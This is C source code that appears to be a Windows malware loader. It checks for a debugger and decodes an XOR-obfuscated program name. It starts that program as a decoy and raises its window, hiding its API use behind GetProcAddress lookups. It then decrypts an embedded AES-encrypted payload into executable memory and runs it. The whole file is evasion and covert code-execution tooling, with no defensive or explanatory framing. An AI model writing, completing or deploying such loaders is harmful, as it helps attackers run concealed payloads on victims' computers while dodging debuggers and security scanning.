#include <windows.h>
#include <stdint.h>
#include "aes.h"
#include "key_iv.h"
#include "payload_data.h"

#define XOR_KEY 0x5A

void xor_decode(char *s) {
    while (*s) *s++ ^= XOR_KEY;
}

typedef LPVOID(WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HWND(WINAPI *GetTopWindow_t)(HWND);
typedef HWND(WINAPI *GetNextWindow_t)(HWND, UINT);
typedef DWORD(WINAPI *GetWindowThreadProcessId_t)(HWND, LPDWORD);
typedef BOOL(WINAPI *IsWindowVisible_t)(HWND);
typedef BOOL(WINAPI *SetForegroundWindow_t)(HWND);
typedef BOOL(WINAPI *ShowWindow_t)(HWND, int);
typedef BOOL(WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef VOID(WINAPI *Sleep_t)(DWORD);
typedef DWORD(WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL(WINAPI *CloseHandle_t)(HANDLE);

BOOL isBeingDebugged() {
    return IsDebuggerPresent();
}

void stealth_exec() {
    VirtualAlloc_t pVA = (VirtualAlloc_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    if (!pVA) return;

    LPVOID ptr = pVA(NULL, payload_enc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ptr) return;

    memcpy(ptr, payload_enc, payload_enc_len);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, AES_IV);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t*)ptr, payload_enc_len);

    ((void(*)())ptr)();
}

void stealth_focus(DWORD pid) {
    HMODULE user = GetModuleHandleA("user32.dll");
    GetTopWindow_t pTop = (GetTopWindow_t)GetProcAddress(user, "GetTopWindow");
    GetNextWindow_t pNext = (GetNextWindow_t)GetProcAddress(user, "GetNextWindow");
    GetWindowThreadProcessId_t pGetPid = (GetWindowThreadProcessId_t)GetProcAddress(user, "GetWindowThreadProcessId");
    IsWindowVisible_t pVis = (IsWindowVisible_t)GetProcAddress(user, "IsWindowVisible");
    SetForegroundWindow_t pSet = (SetForegroundWindow_t)GetProcAddress(user, "SetForegroundWindow");
    ShowWindow_t pShow = (ShowWindow_t)GetProcAddress(user, "ShowWindow");
    Sleep_t pSleep = (Sleep_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");

    HWND h = NULL;
    for (int i = 0; i < 50 && h == NULL; i++) {
        h = pTop(NULL);
        while (h) {
            DWORD winPid = 0;
            pGetPid(h, &winPid);
            if (winPid == pid && pVis(h)) {
                pSet(h);
                pShow(h, SW_RESTORE);
                return;
            }
            h = pNext(h, GW_HWNDNEXT);
        }
        pSleep(100);
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (isBeingDebugged()) return 0;

    Sleep(1000);

    char target[] = { 'k','9','"',')','6','4','-','5','"','4','(',')','"',')','4','"',')','"',0 };
    for (int i = 0; target[i]; i++) target[i] ^= XOR_KEY;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA_t pCreate = (CreateProcessA_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    WaitForSingleObject_t pWait = (WaitForSingleObject_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WaitForSingleObject");
    CloseHandle_t pClose = (CloseHandle_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");

    if (pCreate(target, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        stealth_focus(pi.dwProcessId);
        pWait(pi.hProcess, INFINITE);
        pClose(pi.hProcess);
        pClose(pi.hThread);
    }

    stealth_exec();
    return 0;
}
